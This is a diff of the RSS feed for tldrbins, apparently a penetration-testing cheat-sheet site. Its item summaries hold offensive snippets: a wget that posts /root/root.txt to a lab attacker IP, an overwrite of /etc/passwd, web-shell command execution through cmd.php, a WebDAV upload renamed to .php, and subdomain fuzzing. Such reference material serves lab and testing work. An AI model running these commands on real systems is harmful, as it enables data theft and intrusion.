@@ -8,6 +8,13 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@http/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Advance curl</title>
+      <link>https://tldrbins.github.io/advance_curl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/advance_curl/</guid>
+      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://example.com/cmd.php # Put the POST data to url and use GET curl -G --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://example.com/cmd.php # PUT a file curl -X PUT http://example.com/example.txt -d @example.txt # PUT a file (with creds) curl -X PUT http://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@example.com/example.txt -d @example.txt # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT http://example.com/example.txt --data-binary @example.</description>
+    </item>
+    <item>
       <title>Advance wget</title>
       <link>https://tldrbins.github.io/advance_wget/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -15,25 +22,18 @@
       <description> Advance wget # Provide a file with urls wget --input-file /root/root.txt # POST a file wget --post-file /root/root.txt http://10.10.14.10 # Overwrite a file wget http://10.10.14.10/passwd.txt -O /etc/passwd </description>
     </item>
     <item>
-      <title>Curl</title>
-      <link>https://tldrbins.github.io/advance_curl/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/advance_curl/</guid>
-      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://example.com/cmd.php # Put the POST data to url and use GET curl -G --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://example.com/cmd.php # PUT a file curl -X PUT http://example.com/example.txt -d @example.txt # PUT a file (with creds) curl -X PUT http://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@example.com/example.txt -d @example.txt # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT http://example.com/example.txt --data-binary @example.</description>
-    </item>
-    <item>
       <title>Subdomain Enum</title>
       <link>https://tldrbins.github.io/subdomain_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/subdomain_enum/</guid>
-      <description>wfuzz download wfuzz&#xA;wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com --hw 10 Filter out response with header # For example: Access-Control-Allow-Origin wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Origin: http://FUZZ.example.com&amp;#34; --filter &amp;#34;r.headers.response ~ &amp;#39;Access-Control-Allow-Origin&amp;#39;&amp;#34; -u http://example.com gobuster gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://example.com Add domain/subdomain to /etc/hosts echo &amp;#34;10.10.11.10 example.</description>
+      <description>Add domain/subdomain to /etc/hosts echo &amp;#34;10.10.11.10 example.com&amp;#34; | sudo tee -a /etc/hosts wfuzz gobuster wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com --hw 10 Filter out response with header # For example: Access-Control-Allow-Origin wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Origin: http://FUZZ.example.com&amp;#34; --filter &amp;#34;r.headers.response ~ &amp;#39;Access-Control-Allow-Origin&amp;#39;&amp;#34; -u http://example.com gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.</description>
     </item>
     <item>
       <title>Webdav</title>
       <link>https://tldrbins.github.io/webdav/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/webdav/</guid>
-      <description> davtest Download davtest&#xA;# Without creds davtest -url http://example.com # With creds davtest -url http://example.com -auth &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; curl # Rename a remote file curl -X MOVE -H &amp;#39;Destination:http://example.com/test.php&amp;#39; http://example.com/test.txt </description>
+      <description> Tools davtest curl # Without creds davtest -url http://example.com # With creds davtest -url http://example.com -auth &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; Ref: Download davtest&#xA;# Rename a remote file curl -X MOVE -H &amp;#39;Destination:http://example.com/test.php&amp;#39; http://example.com/test.txt </description>
     </item>
   </channel>
 </rss>
